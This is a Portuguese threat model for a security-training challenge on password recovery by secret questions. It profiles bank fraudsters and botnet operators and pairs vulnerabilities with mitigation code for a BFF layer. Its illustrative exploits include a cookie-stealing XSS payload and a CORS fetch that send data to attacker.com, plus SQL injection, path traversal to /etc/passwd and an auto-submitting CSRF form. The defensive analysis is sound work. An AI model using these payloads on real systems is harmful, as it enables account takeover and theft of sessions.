# ETAPA 1: MODELAGEM DE AMEAÇAS
## Desafio Caju Security Champions - Recuperação de Senha com Validação de Identidade (PID)

---

## 1. CONTEXTO E ESCOPO

### 1.1 Objetivo do Sistema
Implementar um **fluxo seguro de recuperação de senha** baseado em **validação de identidade (PID)** através de perguntas secretas, destinado a beneficiários de uma instituição financeira que não conseguem receber códigos por SMS/e-mail.

### 1.2 Escopo da Análise de Segurança
Esta análise foca exclusivamente nas **camadas de Frontend e BFF**, que serão implementadas para:
- Fornecer interface segura ao usuário
- **Proteger o backend vulnerável** através de mitigações no BFF
- Implementar controles de segurança antes que requisições atinjam o backend

**Importante**: O backend (Lab-v4) contém vulnerabilidades intencionais para fins educacionais. O BFF atuará como **camada de proteção** para prevenir exploração dessas vulnerabilidades.

### 1.3 Arquitetura da Solução

```
┌──────────────────────────────────────────────────────────────┐
│                         INTERNET                             │
│                      (Atacantes)                             │
└──────────────────────┬───────────────────────────────────────┘
                       │
                       ▼
            ┌──────────────────────┐
            │   FRONTEND (React)   │ ◄─── Camada 1: Validação Client-Side
            │   - Input Validation │      Rate Limiting Visual
            │   - CSRF Tokens      │      Sanitização de Dados
            │   - CSP Headers      │
            └──────────┬───────────┘
                       │ HTTPS
                       ▼
            ┌──────────────────────┐
            │    BFF (Node.js)     │ ◄─── Camada 2: PROTEÇÃO PRINCIPAL
            │  - Rate Limiting     │      Validação Profunda
            │  - Input Validation  │      Sanitização de Input
            │  - Session Mgmt      │      Controle de Acesso
            │  - CAPTCHA           │      Anti-Brute Force
            │  - Logging/Monitor   │      Auditoria
            │  - CORS Restritivo   │
            └──────────┬───────────┘
                       │ HTTP Interno
                       ▼
            ┌──────────────────────┐
            │  BACKEND (Kotlin)    │ ◄─── Backend Vulnerável
            │  Lab-v4 - Protegido  │      (Não será modificado)
            │  pelo BFF            │
            └──────────┬───────────┘
                       │
                       ▼
            ┌──────────────────────┐
            │   PostgreSQL + Files │
            └──────────────────────┘
```

---

## 2. IDENTIFICAÇÃO DE ALVOS E OBJETIVOS

### 2.1 Ativos Críticos do Fluxo PID
1. **Credenciais dos Beneficiários**
   - Senhas de acesso
   - Sessões ativas
   - Tokens de recuperação

2. **Dados Pessoais Identificáveis (PII)**
   - CPF (identificador único)
   - Respostas de perguntas secretas
   - Informações cadastrais utilizadas nas perguntas

3. **Integridade do Sistema de Recuperação**
   - Processo de validação de identidade
   - Mecanismo de reset de senha
   - Disponibilidade do serviço

4. **Contas Financeiras dos Beneficiários**
   - Saldos e investimentos
   - Capacidade de realizar transações
   - Reputação da instituição financeira

### 2.2 Objetivos de Segurança
- Prevenir acesso não autorizado através do fluxo de recuperação
- Garantir que apenas o legítimo proprietário possa resetar a senha
- Proteger contra automação e ataques em massa
- Detectar e bloquear tentativas de fraude
- Manter disponibilidade do serviço contra ataques DoS
- **Mitigar vulnerabilidades conhecidas do backend através do BFF**

---

## 3. PERFIS DE ATACANTES PRINCIPAIS

Para o contexto de **instituição financeira brasileira** e **recuperação de senha**, identificamos **3 perfis de atacantes prioritários**:

---

### 3.1 ATACANTE PRIMÁRIO: Fraudador Bancário Profissional

#### Perfil
- **Motivação**: Lucro financeiro direto através de acesso a contas bancárias
- **Sofisticação**: Média a Alta
- **Recursos**: Médios (ferramentas comerciais, dados vazados, proxies)
- **Conhecimento**: Técnicas de fraude financeira, engenharia social, automação básica

#### Capacidades
- Acesso a **databases de CPFs e dados pessoais vazados** (breaches brasileiros são frequentes)
- Ferramentas de **automação de formulários** (Selenium, Puppeteer)
- Uso de **proxies residenciais brasileiros** para mascarar origem
- Conhecimento de **padrões de dados brasileiros** (formato CPF, telefones, endereços)
- **Engenharia social** para obter informações complementares
- Acesso a **serviços de CAPTCHA solving** (2Captcha, Anti-Captcha)

#### Vetores de Ataque no Fluxo PID
1. **Credential Stuffing com Dados Vazados**
   - Uso de CPFs de breaches para iniciar recuperação
   - Respostas baseadas em dados públicos/vazados
   - Taxa de sucesso: 30-50% se perguntas forem baseadas em dados comuns

2. **Força Bruta Semi-Automatizada**
   - Scripts para tentar múltiplas respostas
   - Rotação de IPs para bypass de rate limiting
   - Foco em perguntas com baixa entropia (ex: mês de nascimento = 12 opções)

3. **Enumeração de Usuários Válidos**
   - Identificar CPFs/usuários ativos antes de atacar
   - Reduzir tentativas desnecessárias
   - Construir lista de alvos de alto valor

4. **Exploração de Timing e Respostas Diferentes**
   - Identificar se usuário existe por tempo de resposta
   - Mensagens de erro diferentes revelam informações

#### Objetivos Finais
- **Reset de senha** de conta bancária de beneficiário
- **Transferência fraudulenta** de valores
- **Venda de acesso** à conta em mercados underground (R$ 500-5000 por conta)

#### Impacto Potencial
- **Perda financeira direta** dos beneficiários (média R$ 5.000-50.000)
- **Danos à reputação** da instituição financeira
- **Responsabilidade legal** por segurança inadequada

---

### 3.2 ATACANTE SECUNDÁRIO: BotHerder (Operador de Botnet)

#### Perfil
- **Motivação**: Comprometimento em massa, venda de acessos em escala
- **Sofisticação**: Média
- **Recursos**: Altos (botnet de 10.000+ IPs comprometidos)
- **Conhecimento**: Automação avançada, bypass de proteções básicas

#### Capacidades
- **Botnet distribuída** (10.000-100.000 IPs residenciais)
- **Bypass de rate limiting por IP** através de distribuição
- **Automação headless** (Puppeteer, Playwright em escala)
- **Integração com serviços de CAPTCHA solving**
- **Paralelização massiva** de tentativas

#### Vetores de Ataque no Fluxo PID
1. **Ataque de Força Bruta Distribuído**
   - Milhares de IPs diferentes atacando simultaneamente
   - Bypass de rate limiting por IP tradicional
   - 1-2 tentativas por IP para evitar detecção

2. **Account Takeover em Massa**
   - Foco em volume, não em alvos específicos
   - Taxa de sucesso baixa por conta (5-10%), mas volume compensa
   - Comprometimento de centenas de contas em poucas horas

3. **Denial of Service (DoS) Colateral**
   - Volume de requisições pode derrubar sistema
   - Mesmo com rate limiting, distribuição pode sobrecarregar

4. **Harvesting de Dados**
   - Tentativas de extrair informações sobre usuários válidos
   - Compilação de databases para venda

#### Objetivos Finais
- **Comprometimento em massa** (centenas/milhares de contas)
- **Venda de acessos** em marketplaces underground (R$ 50-500 por conta)
- **Aluguel de acesso** para outros criminosos

#### Impacto Potencial
- **Comprometimento massivo** de beneficiários (centenas a milhares)
- **Indisponibilidade do serviço** (DoS acidental ou intencional)
- **Crise de confiança** na instituição
- **Custo operacional** de resposta a incidentes em massa

---

### 3.3 ATACANTE TERCIÁRIO: Fraudador Oportunista (Carder)

#### Perfil
- **Motivação**: Roubo de identidade, fraude com cartões, venda de dados
- **Sofisticação**: Baixa a Média
- **Recursos**: Baixos (ferramentas gratuitas, breaches públicos)
- **Conhecimento**: Básico em técnicas de fraude, engenharia social

#### Capacidades
- Acesso a **dados públicos de vazamentos** (CPF, nome, data de nascimento)
- **Engenharia social básica** (ligações fingindo ser suporte, phishing)
- Uso de **ferramentas gratuitas** (Burp Suite Community, proxies gratuitos)
- Conhecimento de **técnicas comuns de fraude** em fóruns criminosos
- Acesso a **informações de redes sociais** da vítima

#### Vetores de Ataque no Fluxo PID
1. **Ataque Direcionado com OSINT**
   - Escolhe vítima específica (geralmente conhecida ou de alto valor)
   - Coleta dados públicos: redes sociais, LinkedIn, registros públicos
   - Responde perguntas baseadas em informações coletadas

2. **Phishing Combinado**
   - Envia e-mail falso "sua conta será bloqueada"
   - Direciona vítima para site falso de recuperação
   - Captura respostas reais das perguntas secretas
   - Usa respostas no site legítimo

3. **Social Engineering**
   - Liga para vítima fingindo ser do banco
   - "Precisamos validar sua identidade por segurança"
   - Faz as perguntas secretas e captura respostas
   - Usa respostas para resetar senha

4. **Exploração de Perguntas Fracas**
   - Foca em contas cujas respostas sejam previsíveis
   - Ex: data de nascimento (Facebook), cidade natal (LinkedIn)
   - Tentativas manuais, sem automação

#### Objetivos Finais
- **Acesso a conta individual** de alto valor
- **Roubo de identidade** completo
- **Venda de dados completos** da vítima (R$ 200-2000)
- **Uso de cartões/contas** para compras fraudulentas

#### Impacto Potencial
- **Perda financeira** de beneficiário individual (R$ 5.000-20.000)
- **Roubo de identidade** com consequências duradouras
- **Fraude continuada** (abertura de crédito, empréstimos)

---

## 4. ANÁLISE DE AMEAÇAS NO FLUXO DE RECUPERAÇÃO PID

### 4.1 Fluxo de Recuperação de Senha (Atual - Sem Proteções)

```
1. Beneficiário acessa página de recuperação
2. Informa CPF ou username
3. Sistema busca perguntas secretas do usuário
4. Exibe 5 perguntas
5. Beneficiário responde as 5 perguntas
6. Sistema valida respostas
7. Se correto: permite definir nova senha
8. Senha é atualizada no banco de dados
```

### 4.2 Vulnerabilidades do Fluxo (Responsabilidade do Frontend e BFF)

---

#### **V1. Ausência de Rate Limiting - CRÍTICO**

**Descrição**: Sem limite de tentativas de recuperação por CPF, IP ou sessão

**Exploração por Fraudador Bancário**:
```javascript
// Script automatizado (exemplo ilustrativo)
for (let i = 0; i < 1000; i++) {
  await fetch('https://bank.com/api/recovery/validate', {
    method: 'POST',
    body: JSON.stringify({
      cpf: '123.456.789-00',
      answers: [tentativa1, tentativa2, tentativa3, tentativa4, tentativa5]
    })
  });
}
```
- Permite força bruta ilimitada
- Atacante tenta todas as combinações possíveis
- Ex: Pergunta "mês de nascimento" = 12 tentativas para acertar

**Exploração por BotHerder**:
- Distribuir tentativas por 10.000 IPs
- Cada IP faz 10 tentativas = 100.000 tentativas totais
- Bypass de rate limiting por IP simples

**Impacto**: Comprometimento de conta em minutos/horas

**Mitigação no BFF**:
- Rate limiting por CPF: 3 tentativas a cada 15 minutos
- Rate limiting por IP: 10 tentativas a cada hora
- Rate limiting por sessão: 5 tentativas totais antes de CAPTCHA obrigatório
- Bloqueio temporário progressivo: 15min → 1h → 24h

---

#### **V2. Ausência de CAPTCHA - CRÍTICO**

**Descrição**: Sem desafio de prova de humanidade, permitindo automação completa

**Exploração por BotHerder**:
```python
# Automação com Selenium (exemplo ilustrativo)
for cpf in list_of_cpfs:
    driver.get('https://bank.com/recovery')
    driver.find_element_by_id('cpf').send_keys(cpf)
    # ... responde perguntas automaticamente
```

**Exploração por Fraudador**:
- Scripts Selenium/Puppeteer automatizam todo o fluxo
- Ferramenta Burp Suite Intruder para fuzzing de respostas
- Sem necessidade de interação humana

**Impacto**: Ataques em massa totalmente automatizados

**Mitigação no BFF**:
- reCAPTCHA v3 em todas as páginas (score-based, invisível)
- reCAPTCHA v2 (desafio visual) após 2 tentativas falhadas
- Alternativa: hCaptcha ou Cloudflare Turnstile
- Validação server-side no BFF do token CAPTCHA

---

#### **V3. Ausência de Bloqueio Temporário de Conta - CRÍTICO**

**Descrição**: Após N tentativas falhadas, conta não é bloqueada temporariamente

**Exploração por Fraudador Bancário**:
- Atacante tenta infinitamente até acertar
- Não há penalidade por tentativas erradas
- Contas de alto valor são alvos persistentes

**Cenário Real**:
```
Tentativa 1-10: Respostas baseadas em dados vazados (falha)
Tentativa 11-20: Combinações de nomes comuns (falha)
Tentativa 21-50: Força bruta sistemática (falha)
Tentativa 51: Acerta por sorte/lógica
```

**Impacto**: Persistência do atacante sempre vence

**Mitigação no BFF**:
- **3 tentativas falhadas**: Bloqueio de 15 minutos
- **5 tentativas falhadas**: Bloqueio de 1 hora
- **10 tentativas falhadas**: Bloqueio de 24 horas
- **20 tentativas falhadas**: Bloqueio definitivo (requer contato com suporte)
- Contador persiste mesmo se atacante trocar IP/navegador

---

#### **V4. Enumeração de Usuários - ALTO**

**Descrição**: Sistema revela se CPF/usuário existe através de mensagens diferentes

**Exploração por Fraudador/BotHerder**:
```
POST /api/recovery/initiate
CPF: 123.456.789-00

Resposta para usuário válido:
{ "success": true, "message": "Responda as perguntas abaixo" }

Resposta para usuário inválido:
{ "success": false, "message": "CPF não cadastrado" }
```

**Impacto**:
- Atacante compila lista de CPFs válidos
- Foca esforços apenas em alvos confirmados
- Reduz 90% das tentativas desnecessárias

**Mitigação no BFF**:
- **Resposta uniforme** para válido e inválido:
  ```json
  { "success": true, "message": "Se o CPF estiver cadastrado, as perguntas serão exibidas." }
  ```
- Sempre exibir formulário de perguntas (mesmo para CPF inválido)
- Validação real apenas no backend, invisível ao cliente
- Timing consistente (não revelar por tempo de resposta)

---

#### **V5. Ausência de Input Validation e Sanitização - CRÍTICO**

**Descrição**: Campos de input não são validados/sanitizados antes de enviar ao backend

**Exploração - SQL Injection via Frontend**:
```javascript
// Atacante manipula campo de resposta no DevTools
answer1: "' OR '1'='1' --"
```
Se BFF repassar sem validar, backend vulnerável executa:
```sql
SELECT * FROM secrets WHERE answer = '' OR '1'='1' --'
```

**Exploração - XSS Stored**:
```javascript
answer1: "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>"
```
Se armazenado sem sanitizar, próximo usuário que visualizar executa script

**Exploração - Path Traversal**:
```javascript
username: "../../../../etc/passwd"
```
Se BFF repassar diretamente para `/files/view?name={username}_secrets.json`

**Impacto**:
- **SQLi**: Vazamento completo do banco de dados
- **XSS**: Roubo de sessões de outros usuários
- **Path Traversal**: Leitura de arquivos sensíveis

**Mitigação no BFF**:
```javascript
// Validação rigorosa
const validarCPF = (cpf) => {
  // Remover caracteres não numéricos
  cpf = cpf.replace(/[^\d]/g, '');

  // Verificar tamanho
  if (cpf.length !== 11) return false;

  // Validar dígitos verificadores (algoritmo oficial CPF)
  // ...

  return true;
};

const sanitizarResposta = (resposta) => {
  // Remover caracteres especiais perigosos
  resposta = resposta.replace(/[<>'";\\/]/g, '');

  // Limitar tamanho
  if (resposta.length > 100) {
    resposta = resposta.substring(0, 100);
  }

  // Normalizar (remover espaços extras, lowercase)
  resposta = resposta.trim().toLowerCase();

  return resposta;
};
```

---

#### **V6. Ausência de CSRF Protection - ALTO**

**Descrição**: Sem tokens anti-CSRF, permitindo ataques Cross-Site Request Forgery

**Exploração por Fraudador Oportunista**:
```html
<!-- Site malicioso do atacante -->
<html>
<body>
<h1>Clique aqui para ganhar R$ 1000!</h1>
<form id="hack" action="https://bank.com/api/recovery/reset-password" method="POST">
  <input type="hidden" name="cpf" value="123.456.789-00">
  <input type="hidden" name="newPassword" value="hacked123">
</form>
<script>
  document.getElementById('hack').submit();
</script>
</body>
</html>
```

**Cenário de Ataque**:
1. Vítima está autenticada no sistema bancário
2. Atacante envia link malicioso via phishing
3. Vítima clica no link
4. Formulário oculto é submetido automaticamente
5. Browser envia cookies de sessão da vítima
6. Sistema aceita requisição (sem validação CSRF)
7. Senha da vítima é alterada

**Impacto**: Account takeover de usuário autenticado

**Mitigação no BFF**:
```javascript
// Geração de token CSRF
app.use(csrf({ cookie: true }));

// Em cada resposta, incluir token
res.json({
  csrfToken: req.csrfToken(),
  questions: [...]
});

// Validar token em cada POST
app.post('/api/recovery/validate', (req, res) => {
  // Express-CSRF valida automaticamente
  // Se token inválido, retorna 403
});
```

**Frontend deve incluir token**:
```javascript
fetch('/api/recovery/validate', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': csrfToken
  },
  body: JSON.stringify(data)
});
```

---

#### **V7. Comunicação HTTP sem TLS - CRÍTICO**

**Descrição**: Comunicação entre Frontend-BFF ou BFF-Backend sem HTTPS

**Exploração por Atacante em Rede**:
```
[Usuário] --HTTP--> [WiFi Público Malicioso] ---> [BFF]
            ↓
      [Atacante MITM]
      Captura: CPF, Respostas, Nova Senha
```

**Ferramentas**: Wireshark, mitmproxy, Ettercap, Bettercap

**Cenário Real**:
- Vítima em aeroporto/shopping conecta em WiFi público
- Atacante opera access point falso ou faz ARP spoofing
- Todo tráfego HTTP é capturado em texto claro
- Atacante obtém: CPF, respostas secretas, nova senha

**Impacto**: Vazamento completo de credenciais em trânsito

**Mitigação no BFF e Frontend**:
- **HTTPS obrigatório** em todas as comunicações
- **HSTS (HTTP Strict Transport Security)** header:
  ```javascript
  app.use(helmet.hsts({
    maxAge: 31536000, // 1 ano
    includeSubDomains: true,
    preload: true
  }));
  ```
- **Redirect automático** HTTP → HTTPS
- Certificado SSL/TLS válido (Let's Encrypt gratuito)
- **BFF-Backend**: Se em mesma rede interna, pode usar HTTP, mas preferencialmente HTTPS

---

#### **V8. Ausência de Logging e Monitoramento - ALTO**

**Descrição**: Sem logs de tentativas de recuperação, impossível detectar ataques em andamento

**Exploração**:
- Fraudador faz 1000 tentativas em 1 hora
- Sistema não detecta padrão anormal
- Ataque só é descoberto quando beneficiário reclama (dias depois)

**Impacto**:
- Ataques bem-sucedidos não são detectados
- Resposta a incidentes demorada
- Impossível investigar post-mortem
- Não há alertas em tempo real

**Mitigação no BFF**:
```javascript
// Logging estruturado
const logger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    new winston.transports.File({ filename: 'recovery.log' })
  ]
});

// Log de todas as tentativas
app.post('/api/recovery/validate', async (req, res) => {
  const { cpf, answers } = req.body;
  const ip = req.ip;
  const userAgent = req.get('User-Agent');

  logger.info('recovery_attempt', {
    cpf: hashCPF(cpf), // Hash para LGPD
    ip,
    userAgent,
    timestamp: new Date(),
    success: false // Atualizar após validação
  });

  // ... validação

  if (tentativasFalhadas >= 3) {
    logger.warn('recovery_multiple_failures', {
      cpf: hashCPF(cpf),
      ip,
      count: tentativasFalhadas,
      timestamp: new Date()
    });

    // Enviar alerta para SOC
    await alertar_soc({
      tipo: 'TENTATIVAS_EXCESSIVAS_RECUPERACAO',
      cpf: hashCPF(cpf),
      ip,
      count: tentativasFalhadas
    });
  }
});
```

**Métricas para Monitorar**:
- Tentativas de recuperação por minuto (normal: 10-50, ataque: 1000+)
- Taxa de falhas por CPF (normal: <10%, ataque: >50%)
- IPs com múltiplas tentativas diferentes CPFs (botnet)
- Geolocalização anormal (CPF do Brasil, IP da China)

---

#### **V9. CORS Inadequado - MÉDIO**

**Descrição**: Configuração permissiva de CORS permite requisições de qualquer origem

**Exploração**:
```javascript
// Site malicioso attacker.com
fetch('https://bank.com/api/recovery/questions/123.456.789-00', {
  credentials: 'include' // Envia cookies
}).then(r => r.json()).then(data => {
  // Atacante obtém perguntas secretas do usuário
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
```

**Se BFF responder com**:
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```
Browser permite leitura da resposta pelo site malicioso.

**Impacto**: Vazamento de perguntas secretas via JavaScript malicioso

**Mitigação no BFF**:
```javascript
const cors = require('cors');

// Configuração restritiva
app.use(cors({
  origin: 'https://bank.com', // Apenas domínio do Frontend
  credentials: true,
  methods: ['GET', 'POST'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-CSRF-Token']
}));
```

---

#### **V10. Session Management Inseguro - ALTO**

**Descrição**: Sessões de recuperação sem expiração ou validação adequada

**Exploração - Session Fixation**:
```javascript
// Atacante obtém sessionID válido
// Força vítima a usar esse sessionID
// Quando vítima completa recuperação, atacante tem acesso
```

**Exploração - Session Hijacking**:
- Atacante rouba sessionID via XSS ou network sniffing
- Usa sessionID para continuar processo de recuperação
- Completa reset de senha da vítima

**Mitigação no BFF**:
```javascript
const session = require('express-session');
const RedisStore = require('connect-redis')(session);

app.use(session({
  store: new RedisStore({ client: redisClient }),
  secret: process.env.SESSION_SECRET, // Strong random secret
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: true, // HTTPS only
    httpOnly: true, // Não acessível via JavaScript
    maxAge: 15 * 60 * 1000, // 15 minutos
    sameSite: 'strict' // Proteção CSRF adicional
  }
}));

// Regenerar session ID após login/recuperação
app.post('/api/recovery/validate', (req, res) => {
  req.session.regenerate((err) => {
    // Nova sessão com novo ID
  });
});
```

---

#### **V11. Perguntas com Baixa Entropia - ALTO**

**Descrição**: Perguntas baseadas em dados facilmente descobríveis ou com poucas opções

**Exemplos de Perguntas FRACAS**:
- "Qual seu mês de nascimento?" → 12 opções
- "Qual sua cidade natal?" → ~100 cidades principais no Brasil
- "Qual o nome da sua mãe?" → 50 nomes mais comuns = 80% da população
- "Qual seu CPF?" → Disponível em vazamentos
- "Qual sua data de nascimento?" → Facebook, LinkedIn

**Exploração por Fraudador Bancário**:
```
Pergunta: "Qual o nome da sua mãe?"
Top 10 nomes no Brasil: Maria, Ana, Francisca, Antônia, Adriana, ...

Script tenta:
1. Maria → Falha
2. Ana → Falha
3. Francisca → Sucesso! (tentativa 3 de 50)
```

**Impacto**: Atacante acerta por força bruta ou adivinhação

**Mitigação no BFF** (através de perguntas melhores):

**Perguntas com ALTA Entropia** (difíceis de descobrir/adivinhar):
1. "Qual o valor aproximado do seu último pagamento recebido?" (numérico, alto range)
2. "Qual o nome fantasia da empresa onde você trabalha?" (milhares de opções)
3. "Qual o número da sua agência bancária?" (combinado com outro banco)
4. "Qual o nome do banco onde você tem sua conta salário?" (privado)
5. "Qual o código de segurança de 4 dígitos que você criou no cadastro?" (10.000 opções)

**Adicionalmente**:
- **Combinar múltiplas perguntas** (probabilidade multiplicativa)
  - Acertar 1 pergunta de 12 opções: 8,3% chance
  - Acertar 5 perguntas de 12 opções cada: 0,0000033% chance
- **Perguntas numéricas com range alto**
  - "Últimos 4 dígitos da conta" (10.000 opções)
  - "Valor da última fatura (arredondado)" (infinitas opções)
- **Perguntas temporais**
  - "Data da sua última transação (DD/MM/YYYY)" (difícil de adivinhar)

**Implementação no BFF**:
```javascript
// Gerar perguntas com alta entropia
const gerarPerguntasSeguras = (usuario) => {
  const perguntas = [
    {
      id: 1,
      pergunta: "Qual o valor aproximado (em reais) da sua última transação?",
      tipo: "numerico",
      entropia: "alta" // Milhares de possibilidades
    },
    {
      id: 2,
      pergunta: "Qual o nome da empresa do seu primeiro emprego?",
      tipo: "texto",
      entropia: "alta" // Milhares de empresas
    },
    {
      id: 3,
      pergunta: "Qual o código de segurança de 6 dígitos que você definiu no cadastro?",
      tipo: "numerico",
      entropia: "muito_alta" // 1.000.000 de opções
    },
    {
      id: 4,
      pergunta: "Qual a data (DD/MM/YYYY) da sua última alteração de senha?",
      tipo: "data",
      entropia: "alta" // Impossível adivinhar
    },
    {
      id: 5,
      pergunta: "Qual o nome fantasia completo da empresa onde você trabalha atualmente?",
      tipo: "texto",
      entropia: "alta" // Altamente específico
    }
  ];

  // Selecionar 5 perguntas aleatórias
  return _.shuffle(perguntas).slice(0, 5);
};
```

---

#### **V12. Ausência de Notificação ao Usuário Legítimo - MÉDIO**

**Descrição**: Beneficiário legítimo não é notificado sobre tentativas de recuperação de senha

**Exploração**:
- Atacante tenta recuperar senha por dias
- Beneficiário legítimo não sabe que está sendo atacado
- Quando atacante consegue, já é tarde

**Impacto**: Vítima não pode reagir a tempo

**Mitigação no BFF**:
```javascript
// Após 3 tentativas falhadas
if (tentativasFalhadas === 3) {
  // Enviar SMS/Email ao beneficiário
  await enviarAlerta({
    cpf: usuario.cpf,
    telefone: usuario.telefone,
    email: usuario.email,
    mensagem: `
      Alerta de Segurança

      Identificamos 3 tentativas de recuperação de senha na sua conta.

      Se não foi você:
      - Sua conta foi temporariamente bloqueada por segurança
      - Entre em contato com o suporte imediatamente

      Se foi você:
      - Aguarde 15 minutos e tente novamente
      - Certifique-se de responder corretamente às perguntas
    `
  });
}

// Após recuperação bem-sucedida
if (recuperacaoSucesso) {
  await enviarAlerta({
    cpf: usuario.cpf,
    telefone: usuario.telefone,
    email: usuario.email,
    mensagem: `
      Sua senha foi alterada com sucesso.

      Se não foi você quem fez essa alteração, entre em contato imediatamente.
    `
  });
}
```

---

#### **V13. Ausência de Device Fingerprinting - MÉDIO**

**Descrição**: Sistema não identifica dispositivo usado na recuperação

**Exploração**:
- Atacante de outro país/dispositivo consegue recuperar senha
- Sistema não detecta anomalia de dispositivo nunca usado antes

**Mitigação no BFF**:
```javascript
const Fingerprint = require('fingerprintjs2');

// Frontend coleta fingerprint
const fingerprint = await Fingerprint.get();

// Enviar junto com requisição
fetch('/api/recovery/validate', {
  method: 'POST',
  body: JSON.stringify({
    cpf,
    answers,
    deviceFingerprint: fingerprint
  })
});

// BFF valida
app.post('/api/recovery/validate', async (req, res) => {
  const { cpf, deviceFingerprint } = req.body;

  // Buscar dispositivos conhecidos do usuário
  const dispositivosConhecidos = await db.query(
    'SELECT fingerprint FROM user_devices WHERE cpf = ?',
    [cpf]
  );

  const dispositivoConhecido = dispositivosConhecidos.some(
    d => d.fingerprint === deviceFingerprint
  );

  if (!dispositivoConhecido) {
    // Dispositivo novo = exigir CAPTCHA adicional + notificar usuário
    logger.warn('recovery_unknown_device', {
      cpf: hashCPF(cpf),
      fingerprint: hashFingerprint(deviceFingerprint)
    });

    // Exigir validação adicional
    return res.json({
      success: false,
      requiresAdditionalVerification: true,
      message: 'Dispositivo não reconhecido. Verificação adicional necessária.'
    });
  }

  // Continuar normalmente
});
```

---

## 5. MATRIZ DE AMEAÇAS E PRIORIZAÇÃO

### 5.1 Matriz de Riscos

| ID | Ameaça | Atacante | Probabilidade | Impacto | Criticidade | Mitigação (BFF/Frontend) |
|----|--------|----------|---------------|---------|-------------|--------------------------|
| **T01** | Força Bruta sem Rate Limiting | Fraudador, BotHerder | Muito Alta | Crítico | **CRÍTICA** | Rate limiting, bloqueio progressivo |
| **T02** | Automação sem CAPTCHA | BotHerder | Muito Alta | Crítico | **CRÍTICA** | reCAPTCHA v2/v3 |
| **T03** | Ausência de Bloqueio Temporário | Fraudador | Alta | Crítico | **CRÍTICA** | Bloqueio após N tentativas |
| **T04** | Input Validation Inadequada | Fraudador | Alta | Crítico | **CRÍTICA** | Validação/sanitização rigorosa |
| **T05** | Comunicação HTTP sem TLS | Qualquer | Média | Crítico | **CRÍTICA** | HTTPS obrigatório + HSTS |
| **T06** | Enumeração de Usuários | Fraudador, BotHerder | Alta | Alto | **ALTA** | Respostas uniformes |
| **T07** | CSRF sem Proteção | Fraudador Oportunista | Média | Alto | **ALTA** | Tokens CSRF |
| **T08** | Ausência de Logging | Qualquer | Alta | Alto | **ALTA** | Logging estruturado + alertas |
| **T09** | Session Management Inseguro | Fraudador | Média | Alto | **ALTA** | Sessões seguras (httpOnly, secure, expiração) |
| **T10** | Perguntas com Baixa Entropia | Fraudador, Carder | Muito Alta | Alto | **ALTA** | Perguntas de alta entropia |
| **T11** | CORS Inadequado | Fraudador | Baixa | Médio | **MÉDIA** | CORS restritivo |
| **T12** | Sem Notificação ao Usuário | Qualquer | Alta | Médio | **MÉDIA** | Alertas SMS/Email |
| **T13** | Sem Device Fingerprinting | Fraudador | Média | Médio | **MÉDIA** | Fingerprinting + validação |

### 5.2 Priorização de Implementação

#### **FASE 1 - CRÍTICAS** (Implementar Obrigatoriamente)
1. ✅ **Rate Limiting Multi-Camada** (IP, CPF, Sessão)
2. ✅ **reCAPTCHA v3 (invisível) + v2 (após falhas)**
3. ✅ **Bloqueio Temporário Progressivo**
4. ✅ **Input Validation e Sanitização Rigorosa**
5. ✅ **HTTPS Obrigatório + HSTS**

#### **FASE 2 - ALTAS** (Primeira Iteração)
6. ✅ **Respostas Uniformes** (anti-enumeração)
7. ✅ **Tokens Anti-CSRF**
8. ✅ **Logging Estruturado + Alertas SOC**
9. ✅ **Session Management Seguro**
10. ✅ **Perguntas de Alta Entropia**

#### **FASE 3 - MÉDIAS** (Melhoria Contínua)
11. ⚠️ **CORS Restritivo**
12. ⚠️ **Notificações ao Usuário**
13. ⚠️ **Device Fingerprinting**

---

## 6. MAPEAMENTO DE MITIGAÇÕES (BFF como Camada de Proteção)

### 6.1 Responsabilidades do BFF

O BFF atuará como **camada de proteção principal**, implementando:

```
┌─────────────────────────────────────────────────────────────┐
│                   BFF - CAMADA DE PROTEÇÃO                  │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. Rate Limiting (express-rate-limit)                     │
│     └─ Por IP: 10 req/hora                                 │
│     └─ Por CPF: 3 tentativas/15min                         │
│     └─ Por Sessão: 5 tentativas totais                     │
│                                                             │
│  2. CAPTCHA Validation (reCAPTCHA)                         │
│     └─ v3 (score-based) em todas requests                  │
│     └─ v2 (challenge) após 2 falhas                        │
│                                                             │
│  3. Input Validation & Sanitization                        │
│     └─ Validação de CPF (formato + dígitos verificadores)  │
│     └─ Sanitização de respostas (remove chars perigosos)   │
│     └─ Length limits (100 chars por resposta)              │
│     └─ Whitelist de caracteres permitidos                  │
│                                                             │
│  4. CSRF Protection (csurf middleware)                     │
│     └─ Token gerado em cada sessão                         │
│     └─ Validação em todos POST/PUT/DELETE                  │
│                                                             │
│  5. Security Headers (helmet.js)                           │
│     └─ HSTS (HTTP Strict Transport Security)               │
│     └─ CSP (Content Security Policy)                       │
│     └─ X-Frame-Options (anti-clickjacking)                 │
│     └─ X-Content-Type-Options (anti-MIME sniffing)         │
│                                                             │
│  6. Session Management (express-session + Redis)           │
│     └─ Secure cookies (httpOnly, secure, sameSite)         │
│     └─ Session timeout (15 minutos)                        │
│     └─ Session regeneration após eventos críticos          │
│                                                             │
│  7. Logging & Monitoring (winston + prometheus)            │
│     └─ Log estruturado de todas tentativas                 │
│     └─ Alertas automáticos (3+ falhas, padrões suspeitos)  │
│     └─ Métricas em tempo real (Grafana dashboard)          │
│                                                             │
│  8. CORS Restritivo (cors middleware)                      │
│     └─ Apenas domínio do Frontend autorizado               │
│     └─ Credentials: true (para cookies)                    │
│     └─ Métodos limitados (GET, POST)                       │
│                                                             │
│  9. Bloqueio Temporário (Redis-based)                      │
│     └─ 3 falhas = 15min block                              │
│     └─ 5 falhas = 1h block                                 │
│     └─ 10 falhas = 24h block                               │
│                                                             │
│ 10. Resposta Uniforme (anti-enumeration)                   │
│     └─ Mesma mensagem para válido/inválido                 │
│     └─ Timing consistente (artificial delay)               │
│                                                             │
└─────────────────────────────────────────────────────────────┘
                            ▼
                   (Passa ao Backend apenas
                    requisições validadas e
                    seguras)
```

### 6.2 Responsabilidades do Frontend

```
┌─────────────────────────────────────────────────────────────┐
│                FRONTEND - PRIMEIRA LINHA                    │
